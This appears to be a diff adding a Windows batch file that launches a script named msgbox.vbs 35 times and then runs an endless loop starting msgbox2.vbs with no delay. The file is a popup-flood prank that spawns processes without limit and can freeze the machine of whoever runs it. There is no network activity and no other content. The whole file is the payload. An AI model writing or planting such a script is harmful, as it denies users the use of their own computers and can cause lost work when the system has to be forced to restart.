@@ -1,0 +1,40 @@
+@echo off
+start msgbox.vbs
+start msgbox.vbs
+start msgbox.vbs
+start msgbox.vbs
+start msgbox.vbs
+start msgbox.vbs
+start msgbox.vbs
+start msgbox.vbs
+start msgbox.vbs
+start msgbox.vbs
+start msgbox.vbs
+start msgbox.vbs
+start msgbox.vbs
+start msgbox.vbs
+start msgbox.vbs
+start msgbox.vbs
+start msgbox.vbs
+start msgbox.vbs
+start msgbox.vbs
+start msgbox.vbs
+start msgbox.vbs
+start msgbox.vbs
+start msgbox.vbs
+start msgbox.vbs
+start msgbox.vbs
+start msgbox.vbs
+start msgbox.vbs
+start msgbox.vbs
+start msgbox.vbs
+start msgbox.vbs
+start msgbox.vbs
+start msgbox.vbs
+start msgbox.vbs
+start msgbox.vbs
+
+:main
+start msgbox2.vbs
+timeout /t 0
+goto main
